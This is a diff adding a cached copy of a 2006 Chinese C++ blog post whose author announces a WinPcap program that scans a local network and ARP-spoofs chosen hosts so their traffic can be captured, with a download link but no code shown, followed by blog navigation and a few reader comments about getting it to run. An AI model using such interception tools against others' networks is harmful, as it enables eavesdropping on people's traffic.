@@ -1,0 +1,2199 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+
+
+
+
+
+<link rel="stylesheet" type="text/css" href="index.css" media="all">
+</head>
+<body><div id="bd_snap">
+    <div id="bd_snap_head">
+        <a href="http://www.baidu.com/" id="bd_snap_logo" title="到百度首页"></a>
+        <div id="bd_snap_search">
+        <form action="http://www.baidu.com/s"><input name="cl" value="3" type="hidden"><input value="" name="wd" id="bd_snap_kw" maxlength="100"><span id="bd_snap_btn_wr"><input id="bd_snap_su" value="百度一下" class="bd_snap_btn" onmousedown="this.className='bd_snap_btn bd_snap_btn_h'" type="submit"></span></form>
+    	</div>
+    </div>
+    <div id="bd_snap_txt">您查询的关键词是：<span><a style="color: black; background-color: rgb(255, 255, 102); padding: 0pt 3px; font-weight: bold;" href="http://cache.baidu.com/c?m=9f65cb4a8c8507ed4fece763105392230e54f7327e95804b22818448e435061e5a27b0ee743f4344829f272356b2495ee8f42b70321e23b686cc8b4ed6ac925f75ce786a6459db0144dc4aef895124b137e151fedc13f0cbf125e4a4c5d2af4325cc44757c97818b4d7764&amp;p=8a759a46d39e2deb0be2933d7f56&amp;user=baidu&amp;fm=sc&amp;query=arp%C9%A8%C3%E8%D4%B4%C2%EB&amp;qid=e46cc25d34040266&amp;p1=8#baidusnap0">arp</a><a style="color: black; background-color: rgb(160, 255, 255); padding: 0pt 3px; font-weight: bold;" href="http://cache.baidu.com/c?m=9f65cb4a8c8507ed4fece763105392230e54f7327e95804b22818448e435061e5a27b0ee743f4344829f272356b2495ee8f42b70321e23b686cc8b4ed6ac925f75ce786a6459db0144dc4aef895124b137e151fedc13f0cbf125e4a4c5d2af4325cc44757c97818b4d7764&amp;p=8a759a46d39e2deb0be2933d7f56&amp;user=baidu&amp;fm=sc&amp;query=arp%C9%A8%C3%E8%D4%B4%C2%EB&amp;qid=e46cc25d34040266&amp;p1=8#baidusnap1">扫描</a><a style="color: black; background-color: rgb(153, 255, 153); padding: 0pt 3px; font-weight: bold;" href="http://cache.baidu.com/c?m=9f65cb4a8c8507ed4fece763105392230e54f7327e95804b22818448e435061e5a27b0ee743f4344829f272356b2495ee8f42b70321e23b686cc8b4ed6ac925f75ce786a6459db0144dc4aef895124b137e151fedc13f0cbf125e4a4c5d2af4325cc44757c97818b4d7764&amp;p=8a759a46d39e2deb0be2933d7f56&amp;user=baidu&amp;fm=sc&amp;query=arp%C9%A8%C3%E8%D4%B4%C2%EB&amp;qid=e46cc25d34040266&amp;p1=8#baidusnap2">源码</a></span> 。如果打开速度慢，可以尝试<a href="http://cache.baidu.com/c?m=9f65cb4a8c8507ed4fece763105392230e54f7327e95804b22818448e435061e5a27b0ee743f4344829f272356b2495ee8f42b70321e23b686cc8b4ed6ac925f75ce786a6459db0144dc4aef895124b137e151fedc13f0cbf125e4a4c5d2af4325cc44757c97818b4d7764&amp;p=8a759a46d39e2deb0be2933d7f56&amp;user=baidu&amp;fm=sc&amp;query=arp%C9%A8%C3%E8%D4%B4%C2%EB&amp;qid=e46cc25d34040266&amp;p1=8&amp;fast=y">快速版</a>；如果想保存快照，可以<a onclick="window.open('http://cang.baidu.com/do/add?it='+encodeURIComponent(document.title)+'&amp;iu='+encodeURIComponent(location.href)+'&amp;fr=ps#nw=1','_s','scrollbars=no,width=600,height=450,right=75,top=20,status=no,resizable=yes'); return false;" href="http://cang.baidu.com/do/add" target="_top">添加到搜藏</a>；如果想更新或删除快照，可以<a href="http://tousu.baidu.com/webmaster/add" target="">投诉快照</a>。</div>
+    <div id="bd_snap_note">(百度和网页<a href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html">http://www.cppblog.com/saga/archive/2006/07/13/6169.html</a>的作者无关，不对其内容负责。百度快照谨为网络故障时之索引，不代表被搜索网站的即时页面。)</div>
+</div>
+<div id="bd_snap_ln"></div>
+<div style="position: relative;">
+
+
+<title>
+	[原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码 - saga's blog - C++博客
+</title><meta id="metaKeywords" name="keywords" content="[原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码"><link id="RSSLink" title="RSS" type="application/rss+xml" rel="alternate" href="http://www.cppblog.com/saga/rss.aspx">
+
+    <form name="Form1" method="post" action="http://www.cppblog.com/saga/archive/2006/07/13/6169.html" id="Form1">
+<input name="__VIEWSTATE" id="
+__VIEWSTATE" value="" type="hidden">
+
+
+												
+
+        
+<div id="top">
+	
+<div>
+	<table class="HeaderTitles">
+		<tbody><tr>
+			<td>
+				<h1 class="HeaderTitle"><a id="Header1_HeaderTitle" class="HeaderMainTitle" href="http://www.cppblog.com/saga/">saga's blog</a></h1>
+				<p id="tagline">学习，钻研，思考，创新！
+我才刚上路，有好多的期待！</p>
+			</td>
+		</tr>
+	</tbody></table>
+</div>
+<div>
+	<table id="HeaderBar" class="HeaderBar">
+		<tbody><tr>
+			<td class="HeaderBarTab" nowrap="nowrap">
+				
+&nbsp;
+<a id="Header1_MyLinks1_HomeLink" href="http://www.cppblog.com/">C++博客</a>&nbsp;::
+<a id="Header1_MyLinks1_MyHomeLink" href="http://www.cppblog.com/saga/">首页</a>&nbsp;::
+<a id="Header1_MyLinks1_ContactLink" accesskey="9" href="http://www.cppblog.com/saga/contact.aspx?id=1">联系</a>&nbsp;::
+<a id="Header1_MyLinks1_Syndication" href="http://www.cppblog.com/saga/Rss.aspx">聚合</a>
+<a id="Header1_MyLinks1_XMLLink" class="XMLLink" href="http://www.cppblog.com/saga/Rss.aspx"><img src="xml.gif" border="0"></a>&nbsp;::
+<a id="Header1_MyLinks1_Admin" href="http://www.cppblog.com/saga/admin/EditPosts.aspx">管理</a>
+
+			</td>
+			
+			<td class="HeaderBarTabBack" nowrap="nowrap" width="100%">
+				
+
+	<table class="BlogStatsBar">
+		<tbody><tr>
+			<td width="100%">
+			</td>
+			<td class="BlogStatsBar" nowrap="nowrap">
+				&nbsp;
+				33 
+				Posts&nbsp;::
+				2 Stories
+				::
+				173 Comments
+				::
+				0 Trackbacks
+			</td>
+		</tr>
+	</tbody></table>
+
+			</td>
+		</tr>
+	</tbody></table>
+</div>
+
+</div>
+<table id="maintable">
+	<tbody><tr><td id="leftmenu">
+	
+		
+<h3>公告</h3>
+<div class="News">
+	大家叫我saga吧。我打cs用的ID。喜欢足球运动,看电影.现在学习编程!欢迎大家指教与交流.欢迎加我QQ:34085905.（本网页用firefox打开好像排版有问题！）
+<img src="o_al@20pacino.bmp">
+</div>
+
+		
+<h3>常用链接</h3>
+<ul>
+		<li><a id="SingleColumn1_ctl00_repeaterLinks_ctl01_lnkLinkItem" href="http://www.cppblog.com/saga/MyPosts.html">我的随笔</a></li>
+	
+		<li><a id="SingleColumn1_ctl00_repeaterLinks_ctl02_lnkLinkItem" href="http://www.cppblog.com/saga/MyComments.html">我的评论</a></li>
+	
+		<li><a id="SingleColumn1_ctl00_repeaterLinks_ctl03_lnkLinkItem" href="http://www.cppblog.com/saga/OtherPosts.html">我参与的随笔</a></li>
+	</ul>
+<h3>留言簿<span style="font-size: 11px; font-weight: normal;">(10)</span></h3>
+<ul>
+	<li>
+		<a id="SingleColumn1__9505f6_lnkMessages" href="http://www.cppblog.com/saga/Contact.aspx?id=1">给我留言</a>
+	</li><li>
+		<a id="SingleColumn1__9505f6_lnkPublicMsgView" href="http://www.cppblog.com/saga/default.aspx?opt=msg">查看公开留言</a>
+	</li><li>
+		<a id="SingleColumn1__9505f6_lnkPrivateMsgView" href="http://www.cppblog.com/saga/admin/MyMessages.aspx">查看私人留言</a>
+	</li>
+</ul>
+
+<div class="mainMenuBackground">
+
+		<h3>随笔分类<span style="font-size: 11px; font-weight: normal;">(25)</span></h3>
+		
+				<ul>
+			
+				<li class="menuItemList">
+					<a id="SingleColumn1_Categories_CatList_ctl00_LinkList_ctl01_Link" href="http://www.cppblog.com/saga/category/1552.html">Code(5)</a>
+					<span style="width: 10px;">
+						<a id="SingleColumn1_Categories_CatList_ctl00_LinkList_ctl01_RssLink" title="Subscribe to Code(5)" href="http://www.cppblog.com/saga/category/1552.html/rss"><img title="Subscribe to Code(5)" src="xmlsmall.gif" alt="rss" border="0"></a>
+					</span> 
+				</li>
+			
+				<li class="menuItemList">
+					<a id="SingleColumn1_Categories_CatList_ctl00_LinkList_ctl02_Link" href="http://www.cppblog.com/saga/category/1475.html">Help(2)</a>
+					<span style="width: 10px;">
+						<a id="SingleColumn1_Categories_CatList_ctl00_LinkList_ctl02_RssLink" title="Subscribe to Help(2)" href="http://www.cppblog.com/saga/category/1475.html/rss"><img title="Subscribe to Help(2)" src="xmlsmall.gif" alt="rss" border="0"></a>
+					</span> 
+				</li>
+			
+				<li class="menuItemList">
+					<a id="SingleColumn1_Categories_CatList_ctl00_LinkList_ctl03_Link" href="http://www.cppblog.com/saga/category/1428.html">My Comment(3)</a>
+					<span style="width: 10px;">
+						<a id="SingleColumn1_Categories_CatList_ctl00_LinkList_ctl03_RssLink" title="Subscribe to My Comment(3)" href="http://www.cppblog.com/saga/category/1428.html/rss"><img title="Subscribe to My Comment(3)" src="xmlsmall.gif" alt="rss" border="0"></a>
+					</span> 
+				</li>
+			
+				<li class="menuItemList">
+					<a id="SingleColumn1_Categories_CatList_ctl00_LinkList_ctl04_Link" href="http://www.cppblog.com/saga/category/1425.html">Winpcap(2)</a>
+					<span style="width: 10px;">
+						<a id="SingleColumn1_Categories_CatList_ctl00_LinkList_ctl04_RssLink" title="Subscribe to Winpcap(2)" href="http://www.cppblog.com/saga/category/1425.html/rss"><img title="Subscribe to Winpcap(2)" src="xmlsmall.gif" alt="rss" border="0"></a>
+					</span> 
+				</li>
+			
+				<li class="menuItemList">
+					<a id="SingleColumn1_Categories_CatList_ctl00_LinkList_ctl05_Link" href="http://www.cppblog.com/saga/category/1554.html">时势关注(2)</a>
+					<span style="width: 10px;">
+						<a id="SingleColumn1_Categories_CatList_ctl00_LinkList_ctl05_RssLink" title="Subscribe to 时势关注(2)" href="http://www.cppblog.com/saga/category/1554.html/rss"><img title="Subscribe to 时势关注(2)" src="xmlsmall.gif" alt="rss" border="0"></a>
+					</span> 
+				</li>
+			
+				<li class="menuItemList">
+					<a id="SingleColumn1_Categories_CatList_ctl00_LinkList_ctl06_Link" href="http://www.cppblog.com/saga/category/1843.html">转的贴(11)</a>
+					<span style="width: 10px;">
+						<a id="SingleColumn1_Categories_CatList_ctl00_LinkList_ctl06_RssLink" title="Subscribe to 转的贴(11)" href="http://www.cppblog.com/saga/category/1843.html/rss"><img title="Subscribe to 转的贴(11)" src="xmlsmall.gif" alt="rss" border="0"></a>
+					</span> 
+				</li>
+			
+				</ul>
+			
+	
+		<h3>随笔档案<span style="font-size: 11px; font-weight: normal;">(33)</span></h3>
+		
+				<ul>
+			
+				<li class="menuItemList">
+					<a id="SingleColumn1_Categories_CatList_ctl01_LinkList_ctl01_Link" href="http://www.cppblog.com/saga/archive/2008/06.html">2008年6月 (5)</a>
+					<span style="width: 10px;">
+						
+					</span> 
+				</li>
+			
+				<li class="menuItemList">
+					<a id="SingleColumn1_Categories_CatList_ctl01_LinkList_ctl02_Link" href="http://www.cppblog.com/saga/archive/2008/01.html">2008年1月 (4)</a>
+					<span style="width: 10px;">
+						
+					</span> 
+				</li>
+			
+				<li class="menuItemList">
+					<a id="SingleColumn1_Categories_CatList_ctl01_LinkList_ctl03_Link" href="http://www.cppblog.com/saga/archive/2007/12.html">2007年12月 (4)</a>
+					<span style="width: 10px;">
+						
+					</span> 
+				</li>
+			
+				<li class="menuItemList">
+					<a id="SingleColumn1_Categories_CatList_ctl01_LinkList_ctl04_Link" href="http://www.cppblog.com/saga/archive/2007/09.html">2007年9月 (1)</a>
+					<span style="width: 10px;">
+						
+					</span> 
+				</li>
+			
+				<li class="menuItemList">
+					<a id="SingleColumn1_Categories_CatList_ctl01_LinkList_ctl05_Link" href="http://www.cppblog.com/saga/archive/2007/06.html">2007年6月 (2)</a>
+					<span style="width: 10px;">
+						
+					</span> 
+				</li>
+			
+				<li class="menuItemList">
+					<a id="SingleColumn1_Categories_CatList_ctl01_LinkList_ctl06_Link" href="http://www.cppblog.com/saga/archive/2007/05.html">2007年5月 (2)</a>
+					<span style="width: 10px;">
+						
+					</span> 
+				</li>
+			
+				<li class="menuItemList">
+					<a id="SingleColumn1_Categories_CatList_ctl01_LinkList_ctl07_Link" href="http://www.cppblog.com/saga/archive/2007/01.html">2007年1月 (3)</a>
+					<span style="width: 10px;">
+						
+					</span> 
+				</li>
+			
+				<li class="menuItemList">
+					<a id="SingleColumn1_Categories_CatList_ctl01_LinkList_ctl08_Link" href="http://www.cppblog.com/saga/archive/2006/05.html">2006年5月 (5)</a>
+					<span style="width: 10px;">
+						
+					</span> 
+				</li>
+			
+				<li class="menuItemList">
+					<a id="SingleColumn1_Categories_CatList_ctl01_LinkList_ctl09_Link" href="http://www.cppblog.com/saga/archive/2006/04.html">2006年4月 (7)</a>
+					<span style="width: 10px;">
+						
+					</span> 
+				</li>
+			
+				</ul>
+			
+	
+		<h3>文章档案<span style="font-size: 11px; font-weight: normal;">(2)</span></h3>
+		
+				<ul>
+			
+				<li class="menuItemList">
+					<a id="SingleColumn1_Categories_CatList_ctl02_LinkList_ctl01_Link" href="http://www.cppblog.com/saga/archives/2006/06.html">2006年6月 (1)</a>
+					<span style="width: 10px;">
+						
+					</span> 
+				</li>
+			
+				<li class="menuItemList">
+					<a id="SingleColumn1_Categories_CatList_ctl02_LinkList_ctl02_Link" href="http://www.cppblog.com/saga/archives/2006/05.html">2006年5月 (1)</a>
+					<span style="width: 10px;">
+						
+					</span> 
+				</li>
+			
+				</ul>
+			
+	
+		<h3>收藏夹<span style="font-size: 11px; font-weight: normal;">(9)</span></h3>
+		
+				<ul>
+			
+				<li class="menuItemList">
+					<a id="SingleColumn1_Categories_CatList_ctl03_LinkList_ctl01_Link" href="http://www.cppblog.com/saga/favorite/1424.html">资料收藏(9)</a>
+					<span style="width: 10px;">
+						<a id="SingleColumn1_Categories_CatList_ctl03_LinkList_ctl01_RssLink" title="Subscribe to 资料收藏(9)" href="http://www.cppblog.com/saga/favorite/1424.html/rss"><img title="Subscribe to 资料收藏(9)" src="xmlsmall.gif" alt="rss" border="0"></a>
+					</span> 
+				</li>
+			
+				</ul>
+			
+	
+		<h3>技术网站</h3>
+		
+				<ul>
+			
+				<li class="menuItemList">
+					<a id="SingleColumn1_Categories_CatList_ctl04_LinkList_ctl01_Link" href="http://cardmagic.bokee.com/">cardmagic</a>
+					<span style="width: 10px;">
+						
+					</span> 
+				</li>
+			
+				<li class="menuItemList">
+					<a id="SingleColumn1_Categories_CatList_ctl04_LinkList_ctl02_Link" href="http://www.gyzy.org/blog/index.php">gygz</a>
+					<span style="width: 10px;">
+						
+					</span> 
+				</li>
+			
+				<li class="menuItemList">
+					<a id="SingleColumn1_Categories_CatList_ctl04_LinkList_ctl03_Link" href="http://pjf.blogcn.com/index.shtml">PJF</a>
+					<span style="width: 10px;">
+						
+					</span> 
+				</li>
+			
+				<li class="menuItemList">
+					<a id="SingleColumn1_Categories_CatList_ctl04_LinkList_ctl04_Link" href="http://awards.acm.org/turing/">Turing Award </a>
+					<span style="width: 10px;">
+						
+					</span> 
+				</li>
+			
+				<li class="menuItemList">
+					<a id="SingleColumn1_Categories_CatList_ctl04_LinkList_ctl05_Link" href="http://www.winpcap.org/docs/docs31/html/main.html">WinPcap说明文档</a>
+					<span style="width: 10px;">
+						
+					</span> 
+				</li>
+			
+				<li class="menuItemList">
+					<a id="SingleColumn1_Categories_CatList_ctl04_LinkList_ctl06_Link" href="http://www.xyzreg.net/">xyzreg</a>
+					<span style="width: 10px;">
+						
+					</span> 
+				</li>
+			
+				<li class="menuItemList">
+					<a id="SingleColumn1_Categories_CatList_ctl04_LinkList_ctl07_Link" href="http://www.luocong.com/">老罗的缤纷天地</a>
+					<span style="width: 10px;">
+						
+					</span> 
+				</li>
+			
+				<li class="menuItemList">
+					<a id="SingleColumn1_Categories_CatList_ctl04_LinkList_ctl08_Link" href="http://www.cnasm.com/default.asp">无花果</a>
+					<span style="width: 10px;">
+						
+					</span> 
+				</li>
+			
+				</ul>
+			
+	
+		<h3>友链</h3>
+		
+				<ul>
+			
+				<li class="menuItemList">
+					<a id="SingleColumn1_Categories_CatList_ctl05_LinkList_ctl01_Link" href="http://blog.sina.com.cn/u/1224286550" target="_top">慧慧的blog</a>
+					<span style="width: 10px;">
+						
+					</span> 
+				</li>
+			
+				</ul>
+			
+	
+</div>
+
+
+<h3>搜索</h3>
+<ul>
+	<li>
+		</li><li><input value="" style="width: 130px;" name="q" id="q" onkeydown="return SearchGoogle(document.getElementById('q'),event,'www.cppblog.com/saga')" type="text">&nbsp;<input onclick="SearchGoogle(document.getElementById('q'),event,'www.cppblog.com/saga')" value="搜索" name="sa" type="button">
+	</li>
+</ul>
+
+<h3>积分与排名</h3>
+<ul>
+	<li>
+		积分 -
+		63297
+	</li><li>
+		排名 -
+		122
+	</li>
+</ul>
+
+<h3>最新评论
+	<a id="SingleColumn1__56777e_RSSHyperlink1" href="http://www.cppblog.com/saga/CommentsRSS.aspx"><img src="xml.gif" border="0"></a></h3>
+<div class="RecentComment">
+	
+			<ul>
+		
+			<li style="">
+				<a id="SingleColumn1__56777e_CommentList_ctl01_Hyperlink1" href="http://www.cppblog.com/saga/archive/2011/03/15/5727.html#141884">1.&nbsp;re: [求助]急求关于在vc6.0中插入的汇编语句调用api函数的具体方法</a>
+			</li>
+			<li style="">
+				__asm{<br>你所写的汇编语句<br>}
+			</li>
+			<li style="text-align: right; margin-right: 4px;">
+				--liyqxtu</li>
+		
+			<li style="">
+				<a id="SingleColumn1__56777e_CommentList_ctl02_Hyperlink1" href="http://www.cppblog.com/saga/archive/2010/12/31/17721.html#137777">2.&nbsp;re: [收集]关于汇编80X87FPU浮点运算</a>
+			</li>
+			<li style="">
+				请教：本人有个关于80X87FPU浮点运算问题一直没能解决，希望博主能给予指导。
+			</li>
+			<li style="text-align: right; margin-right: 4px;">
+				--1ND935136464</li>
+		
+			<li style="">
+				<a id="SingleColumn1__56777e_CommentList_ctl03_Hyperlink1" href="http://www.cppblog.com/saga/archive/2010/10/31/41044.html#131891">3.&nbsp;re: [下载]UltraEdit的MASM语法着色文件</a>
+			</li>
+			<li style="">
+				asdfasfd afd asfasdfa
+			</li>
+			<li style="text-align: right; margin-right: 4px;">
+				--abc</li>
+		
+			<li style="">
+				<a id="SingleColumn1__56777e_CommentList_ctl04_Hyperlink1" href="http://www.cppblog.com/saga/archive/2010/10/31/41044.html#131890">4.&nbsp;re: [下载]UltraEdit的MASM语法着色文件</a>
+			</li>
+			<li style="">
+				abcdefg asdfs sdf
+			</li>
+			<li style="text-align: right; margin-right: 4px;">
+				--abc</li>
+		
+			<li style="">
+				<a name="baidusnap2"></a><a id="SingleColumn1__56777e_CommentList_ctl05_Hyperlink1" href="http://www.cppblog.com/saga/archive/2010/08/16/38913.html#123611">5.&nbsp;re: [原创]PE文件基本信息查看器及vc<b style="color: black; background-color: rgb(153, 255, 153);">源码</b> 下载</a>
+			</li>
+			<li style="">
+				谢谢
+<br>
+			</li>
+			<li style="text-align: right; margin-right: 4px;">
+				--有缘人</li>
+		
+			</ul>
+		
+</div>
+
+<h3>阅读排行榜</h3>
+<div class="RecentComment">
+	
+			<ul style="">
+		
+			<li>
+				<a id="SingleColumn1__1426c8c_TopList_ctl01_Hyperlink1" href="http://www.cppblog.com/saga/archive/2007/06/19/26652.aspx">1.&nbsp;[转帖]fstream的使用方法介绍(7929)</a>
+			</li>
+		
+			<li>
+				<a name="baidusnap0"></a><a id="SingleColumn1__1426c8c_TopList_ctl02_Hyperlink1" href="http://www.cppblog.com/saga/archive/2006/04/24/6169.aspx">2.&nbsp;[原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码(7761)</a>
+			</li>
+		
+			<li>
+				<a id="SingleColumn1__1426c8c_TopList_ctl03_Hyperlink1" href="http://www.cppblog.com/saga/archive/2006/04/16/5654.aspx">3.&nbsp;[原创]用Winpcap函数转发包需要留心的一点(4257)</a>
+			</li>
+		
+			<li>
+				<a id="SingleColumn1__1426c8c_TopList_ctl04_Hyperlink1" href="http://www.cppblog.com/saga/archive/2007/12/22/39281.aspx">4.&nbsp;[解释]“hardcode”是什么意思？(3885)</a>
+			</li>
+		
+			<li>
+				<a id="SingleColumn1__1426c8c_TopList_ctl05_Hyperlink1" href="http://www.cppblog.com/saga/archive/2007/05/21/24566.aspx">5.&nbsp;[收集]计算机痕迹的简单消除(3399)</a>
+			</li>
+		
+			</ul>
+		
+</div>
+
+<h3>评论排行榜</h3>
+<div class="RecentComment">
+	
+			<ul style="">
+		
+			<li>
+				<a id="SingleColumn1__1886ad7_TopList_ctl01_Hyperlink1" href="http://www.cppblog.com/saga/archive/2006/04/24/6169.aspx">1.&nbsp;[原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码(86)</a>
+			</li>
+		
+			<li>
+				<a id="SingleColumn1__1886ad7_TopList_ctl02_Hyperlink1" href="http://www.cppblog.com/saga/archive/2008/06/16/53397.aspx">2.&nbsp;[转载]清华学生怒批杨振宁：不忠不孝不仁不义(15)</a>
+			</li>
+		
+			<li>
+				<a id="SingleColumn1__1886ad7_TopList_ctl03_Hyperlink1" href="http://www.cppblog.com/saga/archive/2007/12/06/37920.aspx">3.&nbsp;[请教]MFC建立的对话框程序在主窗口InitInstance()函数里面无法建立窗口原因，请高手指点！(10)</a>
+			</li>
+		
+			<li>
+				<a id="SingleColumn1__1886ad7_TopList_ctl04_Hyperlink1" href="http://www.cppblog.com/saga/archive/2006/04/16/5654.aspx">4.&nbsp;[原创]用Winpcap函数转发包需要留心的一点(10)</a>
+			</li>
+		
+			<li>
+				<a id="SingleColumn1__1886ad7_TopList_ctl05_Hyperlink1" href="http://www.cppblog.com/saga/archive/2006/04/13/5468.aspx">5.&nbsp;[原创]用winpcap获取本地mac的一段代码!(8)</a>
+			</li>
+		
+			</ul>
+		
+</div>
+
+	
+</td><td id="main">
+	
+					
+<div class="post">
+			<div class="postTitle">
+				<a id="viewpost1_TitleUrl" href="http://www.cppblog.com/saga/archive/2006/04/24/6169.html">[原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码</a>
+			</div>
+	
+	<div class="postText">
+		
+		<p align="left">&nbsp;&nbsp;&nbsp; 自己刚刚写的,在win2k下运行正常,当然要先安装Winpcap3.1或其他版本.下载地址:<a href="http://www.winpcap.org/">http://www.winpcap.org/</a><br>&nbsp;&nbsp;&nbsp;&nbsp;程序功能很简单,就是<a name="baidusnap1"></a><b style="color: black; background-color: rgb(160, 255, 255);">扫描</b>内网活动主机,自己选择欺骗哪一台.或几台.使其数据流经你的本地主机,你就可以用截包工具如Ethereal截包分析.<br>&nbsp;&nbsp;&nbsp;&nbsp; 程序和代码下载地址:<a href="http://www.cppblog.com/Files/saga/arpsproof.rar">http://www.cppblog.com/Files/saga/arpsproof.rar</a><br>&nbsp;&nbsp;&nbsp;&nbsp; 注释比较详细,不理解之处可以与我研究探讨.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;编译的时候要注意设置!!!<img src="icon20.gif" border="0" height="20" width="20"><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ----saga.constantine</p>
+
+	</div>
+	
+	<div class="postfoot">
+		posted on 2006-04-24 14:26 <a href="http://www.cppblog.com/saga/">saga.constantine</a> 阅读(7761) <a href="#Post">评论(86)</a> &nbsp;<a href="http://www.cppblog.com/saga/admin/EditPosts.aspx?postid=6169">编辑</a>&nbsp;<a href="http://www.cppblog.com/saga/AddToFavorite.aspx?id=6169">收藏</a> <a href="http://www.cppblog.com/saga/services/trackbacks/6169.aspx">引用</a>  所属分类: <a href="http://www.cppblog.com/saga/category/1552.html">Code</a> 
+	</div>
+</div>
+<img src="6169.html" height="1" width="1">
+
+<!--
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+xmlns:dc="http://purl.org/dc/elements/1.1/"
+xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
+<rdf:Description
+rdf:about="http://www.cppblog.com/saga/archive/2006/04/24/6169.html"
+dc:identifier="http://www.cppblog.com/saga/archive/2006/04/24/6169.html"
+dc:title="[原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码"
+trackback:ping="http://www.cppblog.com/saga/services/trackbacks/6169.aspx" />
+</rdf:RDF>
+-->
+
+
+<div id="AjaxHolder_UpdatePanel1">
+	    
+    <a name="pagedcomment"></a>
+<a name="feedback"></a>
+<div id="comments">
+	<h3>Feedback</h3>
+		
+		
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#6666">#</a>&nbsp;<a name="6666"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2006-05-06 16:25
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl00_NameLink" target="_blank">龚超雄</a>
+					</div>
+					<div class="postText">
+						为什么在windows xp下面就不可以执行你 的代码呢?
+<br>&nbsp;&nbsp;<a onclick='return SetReplyAuhor("龚超雄")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e9%be%9a%e8%b6%85%e9%9b%84" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl00_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl00$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl00_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#6729">#</a>&nbsp;<a name="6729"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2006-05-08 08:22
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl01_NameLink" href="http://www.cppblog.com/saga/" target="_top">saga.constantine</a>
+					</div>
+					<div class="postText">
+						@龚超雄
+<br>你安装Winpcap了吗??我安的是Winpcap3.1  我再到xp下试试
+<br>&nbsp;&nbsp;<a onclick='return SetReplyAuhor("saga.constantine")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=saga.constantine" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl01_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl01$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl01_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#6744">#</a>&nbsp;<a name="6744"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2006-05-08 14:42
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl02_NameLink" target="_blank">龚超雄</a>
+					</div>
+					<div class="postText">
+						好的!我安装的也是winpcap3.1用的是vc++6.0总是不可以!你弄好了告诉我一下啊!先谢谢了!我的xp是sp2的!&nbsp;&nbsp;<a onclick='return SetReplyAuhor("龚超雄")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e9%be%9a%e8%b6%85%e9%9b%84" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl02_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl02$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl02_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
